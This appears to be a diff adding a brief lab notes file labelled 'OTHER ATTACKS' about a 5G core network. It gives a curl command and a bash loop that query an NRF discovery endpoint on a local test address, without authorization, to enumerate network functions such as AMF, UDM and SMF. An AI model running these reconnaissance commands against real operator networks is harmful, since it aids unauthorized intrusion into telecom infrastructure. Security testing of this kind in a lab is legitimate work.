@@ -1,0 +1,23 @@
+OTHER ATTACKS 
+
+1)unauthorized service discovery attack:
+
+curl --http2-prior-knowledge "http://127.0.0.10:7777/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM"
+
+2)discovering functions of the 5g core :
+
+#!/bin/bash
+#Discover NF instances using both requester and target NF type, with HTTP/2
+
+NRF_IP="127.0.0.10"
+NRF_PORT="7777"
+REQUESTER_NF="AMF"
+
+#Loop through NF types
+for nf_type in "AMF" "SMF" "UDM" "UDR" "PCF" "AUSF" "UPF" "NSSF"; do
+echo -e "\n=== Discovering $nf_type (requester=$REQUESTER_NF, target=$nf_type) ==="
+curl --http2-prior-knowledge -s -X GET \
+"http://${NRF_IP}:${NRF_PORT}/nnrf-disc/v1/nf-instances?requester-nf-type=${REQUESTER_NF}&target-nf-type=${nf_type}" \
+-H "Accept: application/json" | jq '.'
+sleep 1
+done
